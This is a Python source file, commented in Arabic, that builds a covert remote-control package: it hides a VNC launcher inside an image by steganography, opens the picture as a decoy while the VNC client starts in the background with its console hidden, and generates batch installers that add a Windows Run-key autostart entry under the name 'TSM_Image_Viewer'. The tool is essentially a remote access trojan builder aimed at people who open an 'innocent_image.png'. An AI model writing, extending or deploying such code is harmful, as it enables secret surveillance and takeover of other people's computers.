#!/usr/bin/env python3
"""
TSM-SeniorOasisPanel Auto Launcher
مشغل تلقائي متقدم للـ VNC المخفي مع التفعيل الفوري
"""

import os
import sys
import time
import threading
import subprocess
import tempfile
import shutil
import winreg
import win32api
import win32con
import win32gui
import win32process
import win32security
from PIL import Image
import ctypes
from ctypes import wintypes

class TSMAutoLauncher:
    """مشغل تلقائي متقدم للـ VNC المخفي"""
    
    def __init__(self):
        self.running = False
        self.auto_vnc = None
        self.input_controller = None
        self.desktop_controller = None
        self.temp_dir = None
        self.hidden_mode = True
        
    def create_stealth_image(self, original_image, server_host='localhost', server_port=5001):
        """إنشاء صورة مخفية مع VNC تلقائي"""
        try:
            from TSM_ImageSteganography import TSMImageSteganography
            
            # إنشاء كود VNC التلقائي المخفي
            stealth_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Image Viewer - TSM-SeniorOasisPanel Hidden Launcher
مشاهد الصور - مشغل TSM مخفي
"""

import os
import sys
import time
import threading
import subprocess
import tempfile
import ctypes
from PIL import Image
import win32api
import win32con
import win32gui

class TSMStealthLauncher:
    def __init__(self):
        self.server_host = '{server_host}'
        self.server_port = {server_port}
        self.running = False
        self.hidden = True
        
    def hide_console(self):
        """إخفاء نافذة الكونسول"""
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def start_stealth_vnc(self):
        """بدء VNC المخفي"""
        try:
            # إخفاء الكونسول
            self.hide_console()
            
            # استيراد وبدء VNC التلقائي
            from TSM_AutoVNC import TSMAutoVNC, TSMAutoLauncher
            from TSM_InputController import TSMDesktopController
            
            # إنشاء مشغل VNC
            launcher = TSMAutoLauncher()
            
            # بدء VNC مع السيطرة الكاملة
            if launcher.extract_and_run_vnc(
                os.path.join(os.path.dirname(__file__), "stealth_image.png"),
                self.server_host,
                self.server_port
            ):
                print("TSM-SeniorOasisPanel: Stealth VNC started")
                self.running = True
                
                # مراقبة الاتصال
                launcher.monitor_connection()
            else:
                print("TSM-SeniorOasisPanel: Stealth VNC failed to start")
                
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Stealth VNC error: {{e}}")
    
    def show_image(self, image_path):
        """عرض الصورة (الواجهة العادية)"""
        try:
            # فتح الصورة باستخدام العرض الافتراضي
            os.startfile(image_path)
            
            # بدء VNC في الخلفية
            vnc_thread = threading.Thread(target=self.start_stealth_vnc, daemon=True)
            vnc_thread.start()
            
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Image display error: {{e}}")

def main():
    launcher = TSMStealthLauncher()
    
    if len(sys.argv) > 1:
        image_path = sys.argv[1]
        launcher.show_image(image_path)
    else:
        # البحث عن الصورة في نفس المجلد
        current_dir = os.path.dirname(__file__)
        image_files = [f for f in os.listdir(current_dir) if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
        
        if image_files:
            launcher.show_image(os.path.join(current_dir, image_files[0]))
        else:
            print("TSM-SeniorOasisPanel: No image file found")

if __name__ == "__main__":
    main()
'''
            
            # حفظ الكود المخفي
            stealth_file = "TSM_Stealth_Launcher.py"
            with open(stealth_file, 'w', encoding='utf-8') as f:
                f.write(stealth_code)
            
            # تضمين الكود في الصورة
            stego = TSMImageSteganography()
            stealth_image = "TSM_Stealth_Image.png"
            
            if stego.embed_client_in_image(original_image, stealth_file, stealth_image):
                print(f"TSM-SeniorOasisPanel: Stealth image created: {stealth_image}")
                
                # تنظيف الملف المؤقت
                if os.path.exists(stealth_file):
                    os.remove(stealth_file)
                
                return stealth_image
            else:
                print("TSM-SeniorOasisPanel: Stealth image creation failed")
                return None
                
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Stealth image creation error: {e}")
            return None
    
    def create_auto_start_launcher(self, stealth_image, output_dir="TSM_Deployment"):
        """إنشاء مشغل التفعيل التلقائي"""
        try:
            # إنشاء مجلد النشر
            if not os.path.exists(output_dir):
                os.makedirs(output_dir)
            
            # نسخ الصورة المخفية
            deployed_image = os.path.join(output_dir, "innocent_image.png")
            shutil.copy2(stealth_image, deployed_image)
            
            # إنشاء مشغل التفعيل التلقائي
            launcher_code = f'''@echo off
REM TSM-SeniorOasisPanel Auto Launcher
REM مشغل TSM التلقائي

echo Starting image viewer...
python "TSM_Stealth_Launcher.py" "innocent_image.png"
'''
            
            launcher_file = os.path.join(output_dir, "view_image.bat")
            with open(launcher_file, 'w', encoding='utf-8') as f:
                f.write(launcher_code)
            
            # إنشاء مشغل VNC المخفي
            vnc_launcher_code = f'''#!/usr/bin/env python3
import os
import sys
import time
import threading
import subprocess
import tempfile
import ctypes
from TSM_AutoVNC import TSMAutoVNC, TSMAutoLauncher
from TSM_InputController import TSMDesktopController

def main():
    # إخفاء نافذة الكونسول
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # إعدادات الخادم
    server_host = '{self.server_host if hasattr(self, "server_host") else "localhost"}'
    server_port = {self.server_port if hasattr(self, "server_port") else 5001}
    
    # إنشاء مشغل VNC
    launcher = TSMAutoLauncher()
    
    # استخراج وتشغيل VNC
    image_path = os.path.join(os.path.dirname(__file__), "innocent_image.png")
    if os.path.exists(image_path):
        launcher.extract_and_run_vnc(image_path, server_host, server_port)
        
        # مراقبة الاتصال
        launcher.monitor_connection()
    else:
        print("TSM-SeniorOasisPanel: Image file not found")

if __name__ == "__main__":
    main()
'''
            
            vnc_launcher_file = os.path.join(output_dir, "TSM_Stealth_Launcher.py")
            with open(vnc_launcher_file, 'w', encoding='utf-8') as f:
                f.write(vnc_launcher_code)
            
            # إنشاء ملف README
            readme_content = f'''# TSM-SeniorOasisPanel Deployment Package
# حزمة نشر TSM-SeniorOasisPanel

## الملفات المضمنة:
- innocent_image.png: صورة تحتوي على VNC مخفي
- view_image.bat: مشغل عرض الصورة
- TSM_Stealth_Launcher.py: مشغل VNC المخفي

## طريقة الاستخدام:
1. انقر نقراً مزدوجاً على view_image.bat
2. ستفتح الصورة وتبدأ VNC تلقائياً في الخلفية
3. سيتم الاتصال بالخادم: {self.server_host if hasattr(self, "server_host") else "localhost"}:{self.server_port if hasattr(self, "server_port") else 5001}

## ملاحظات:
- تأكد من تشغيل خادم TSM قبل استخدام هذه الحزمة
- VNC سيعمل في الخلفية بشكل مخفي
- يمكن التحكم في الشاشة عن بُعد من خلال الخادم
'''
            
            readme_file = os.path.join(output_dir, "README.txt")
            with open(readme_file, 'w', encoding='utf-8') as f:
                f.write(readme_content)
            
            print(f"TSM-SeniorOasisPanel: Auto start launcher created in {output_dir}")
            return output_dir
            
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Auto launcher creation error: {e}")
            return None
    
    def setup_auto_start(self, launcher_path):
        """إعداد التفعيل التلقائي عند بدء التشغيل"""
        try:
            # إضافة إلى بدء التشغيل
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            
            launcher_exe = os.path.join(launcher_path, "view_image.bat")
            winreg.SetValueEx(key, "TSM_Image_Viewer", 0, winreg.REG_SZ, launcher_exe)
            winreg.CloseKey(key)
            
            print("TSM-SeniorOasisPanel: Auto start configured")
            return True
            
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Auto start setup error: {e}")
            return False
    
    def create_installer(self, stealth_image, output_dir="TSM_Installer"):
        """إنشاء مثبت تلقائي"""
        try:
            if not os.path.exists(output_dir):
                os.makedirs(output_dir)
            
            # إنشاء مثبت
            installer_code = f'''@echo off
echo TSM-SeniorOasisPanel Installer
echo مثبت TSM-SeniorOasisPanel
echo.

REM إنشاء مجلد التطبيق
set APP_DIR=%USERPROFILE%\\TSM_Image_Viewer
if not exist "%APP_DIR%" mkdir "%APP_DIR%"

REM نسخ الملفات
copy "innocent_image.png" "%APP_DIR%\\"
copy "TSM_Stealth_Launcher.py" "%APP_DIR%\\"
copy "view_image.bat" "%APP_DIR%\\"

REM إعداد التفعيل التلقائي
reg add "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "TSM_Image_Viewer" /t REG_SZ /d "%APP_DIR%\\view_image.bat" /f

echo.
echo Installation completed!
echo تم الانتهاء من التثبيت!
echo.
echo The image viewer will start automatically on next boot.
echo سيبدأ مشاهد الصور تلقائياً عند بدء التشغيل التالي.
echo.
pause
'''
            
            installer_file = os.path.join(output_dir, "install.bat")
            with open(installer_file, 'w', encoding='utf-8') as f:
                f.write(installer_code)
            
            # نسخ الملفات المطلوبة
            shutil.copy2(stealth_image, os.path.join(output_dir, "innocent_image.png"))
            
            # إنشاء مشغل VNC
            vnc_launcher_code = f'''#!/usr/bin/env python3
import os
import sys
import time
import threading
import subprocess
import tempfile
import ctypes
from TSM_AutoVNC import TSMAutoVNC, TSMAutoLauncher
from TSM_InputController import TSMDesktopController

def main():
    # إخفاء نافذة الكونسول
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # إعدادات الخادم
    server_host = 'localhost'
    server_port = 5001
    
    # إنشاء مشغل VNC
    launcher = TSMAutoLauncher()
    
    # استخراج وتشغيل VNC
    image_path = os.path.join(os.path.dirname(__file__), "innocent_image.png")
    if os.path.exists(image_path):
        launcher.extract_and_run_vnc(image_path, server_host, server_port)
        
        # مراقبة الاتصال
        launcher.monitor_connection()
    else:
        print("TSM-SeniorOasisPanel: Image file not found")

if __name__ == "__main__":
    main()
'''
            
            vnc_launcher_file = os.path.join(output_dir, "TSM_Stealth_Launcher.py")
            with open(vnc_launcher_file, 'w', encoding='utf-8') as f:
                f.write(vnc_launcher_code)
            
            # إنشاء مشغل عرض الصورة
            viewer_code = f'''@echo off
REM TSM-SeniorOasisPanel Image Viewer
REM مشاهد صور TSM

echo Starting image viewer...
python "TSM_Stealth_Launcher.py" "innocent_image.png"
'''
            
            viewer_file = os.path.join(output_dir, "view_image.bat")
            with open(viewer_file, 'w', encoding='utf-8') as f:
                f.write(viewer_code)
            
            print(f"TSM-SeniorOasisPanel: Installer created in {output_dir}")
            return output_dir
            
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Installer creation error: {e}")
            return None

def main():
    """الدالة الرئيسية"""
    if len(sys.argv) < 2:
        print("Usage:")
        print("  Create Stealth Image: python TSM_AutoLauncher.py create <image> [server_host] [server_port]")
        print("  Create Installer: python TSM_AutoLauncher.py installer <image> [server_host] [server_port]")
        sys.exit(1)
    
    operation = sys.argv[1].lower()
    
    if operation == 'create':
        if len(sys.argv) < 3:
            print("Usage: python TSM_AutoLauncher.py create <image> [server_host] [server_port]")
            sys.exit(1)
        
        image_path = sys.argv[2]
        server_host = sys.argv[3] if len(sys.argv) > 3 else 'localhost'
        server_port = int(sys.argv[4]) if len(sys.argv) > 4 else 5001
        
        if not os.path.exists(image_path):
            print(f"Error: Image file '{image_path}' not found")
            sys.exit(1)
        
        launcher = TSMAutoLauncher()
        launcher.server_host = server_host
        launcher.server_port = server_port
        
        # إنشاء الصورة المخفية
        stealth_image = launcher.create_stealth_image(image_path, server_host, server_port)
        if stealth_image:
            # إنشاء مشغل التفعيل التلقائي
            launcher.create_auto_start_launcher(stealth_image)
    
    elif operation == 'installer':
        if len(sys.argv) < 3:
            print("Usage: python TSM_AutoLauncher.py installer <image> [server_host] [server_port]")
            sys.exit(1)
        
        image_path = sys.argv[2]
        server_host = sys.argv[3] if len(sys.argv) > 3 else 'localhost'
        server_port = int(sys.argv[4]) if len(sys.argv) > 4 else 5001
        
        if not os.path.exists(image_path):
            print(f"Error: Image file '{image_path}' not found")
            sys.exit(1)
        
        launcher = TSMAutoLauncher()
        launcher.server_host = server_host
        launcher.server_port = server_port
        
        # إنشاء الصورة المخفية
        stealth_image = launcher.create_stealth_image(image_path, server_host, server_port)
        if stealth_image:
            # إنشاء المثبت
            launcher.create_installer(stealth_image)
    
    else:
        print("Invalid operation. Use 'create' or 'installer'")
        sys.exit(1)

if __name__ == "__main__":
    main()
